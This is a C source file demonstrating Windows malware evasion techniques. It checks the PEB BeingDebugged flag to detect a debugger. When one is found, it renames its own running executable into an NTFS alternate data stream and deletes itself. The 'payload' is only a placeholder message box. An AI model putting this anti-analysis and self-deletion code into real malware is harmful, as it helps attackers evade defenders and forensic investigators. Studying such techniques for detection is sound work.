#include "windows.h"
#include "winternl.h"
#include "stdio.h"

/** 
 * Use NTFS data stream to copy the malware to a hidden data stream, 
 * deleting the original version while still running then deleting itself 
 **/
#define NEW_DATA_STREAM L":TEMP"

/* Pointer to PEB */
extern PPEB getPEB(void); 

/**
 * CheckDebugger() checks if malware is being debugged
 * Returns BOOL
*/
BOOL CheckDebugger(void) {
    printf("Getting the PEB...\n");
    PPEB pPEB = getPEB();
    printf("Debug Status: 0x%d\n", pPEB->BeingDebugged);

    if (pPEB->BeingDebugged != 0) {
        printf("Debugger detected!\n");
        return TRUE;
    }

    printf("No debugger detected.\n");
    return FALSE;
}

int selfDelete(void) {
    /* Variable Declaration */
    HANDLE                  hFile                   = INVALID_HANDLE_VALUE; /* Weird edge case since we want a temporary data stream */
    const wchar_t*          NEWSTREAM               = (const wchar_t*)NEW_DATA_STREAM; /* typecast our data stream into a wide char */
    size_t                  RenameSize              = sizeof(FILE_RENAME_INFO) * sizeof(NEW_DATA_STREAM); /* Create a field to allow for creating NTFS data stream */
    PFILE_RENAME_INFO       PFRI                    = NULL; 
    WCHAR                   PathSize[2 * MAX_PATH]  = {0}; /*2 * max path because of wide chars */
    FILE_DISPOSITION_INFO   SetDelete               = {0}; /* Mark file for deletion when true */

    /* ===== Allocate Buffer for File Rename ===== */
    PFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);
    if (!PFRI) {
        printf("Failed to allocate space in the heap\n");
        return EXIT_FAILURE;
    }
    printf("Allocated memory in heap, PFRI: 0x%p\n", PFRI);

    printf("Clearing space in memory...\n");
    ZeroMemory(PathSize, sizeof(PathSize));
    ZeroMemory(&SetDelete, sizeof(FILE_DISPOSITION_INFO));
    printf("Memory ready!\n");

    /* ===== Mark file for deletion ===== */
    printf("Marking file for deletion...\n");
    SetDelete.DeleteFile = TRUE;
    
    /* Set temp datastream buffer and size in FILE_RENAME_INFO structure */
    PFRI->FileNameLength = sizeof(NEW_DATA_STREAM);
    RtlCopyMemory(PFRI->FileName, NEW_DATA_STREAM, sizeof(NEW_DATA_STREAM));
    printf("Set length and name with data stream.\n");

    /* ===== Get current filename ===== */
    printf("Getting current filename...\n");
    if (GetModuleFileNameW(NULL, PathSize, MAX_PATH * 2) == 0) {
        printf("Failed to get filename. Exiting...\n");
        return EXIT_FAILURE;
    }

    /* ===== Get file handle ===== */
    printf("Starting to rename files...\n");
    printf("\t- Getting handle to current file...\n");
    hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to get header to file. Exiting...\n");
        return EXIT_FAILURE;
    }

    /* ===== Rename file ===== */
    if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, RenameSize)) {
        printf("Failed to rewrite data stream. Exiting...\n");
        EXIT_FAILURE;
    }
    CloseHandle(hFile);

    /* ===== Deleting file ===== */
    /* handle to alternate data stream */
    hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to get header to file. Exiting...\n");
        return EXIT_FAILURE;
    }

    /* mark file for deletion */
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &SetDelete, sizeof(SetDelete))) {
        printf("Failed to mark file for deletion. Exiting...\n");
        return EXIT_FAILURE;
    }

    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, PFRI);

    return EXIT_SUCCESS;
}

int main(void) {
    if (!CheckDebugger()) {
        printf("Executing payload...\n");
        MessageBoxW(NULL, L"Payload", L"Payload", MB_ICONEXCLAMATION);
        return EXIT_SUCCESS;
    }

    printf("Beginning self destruction...\n");
    selfDelete();
}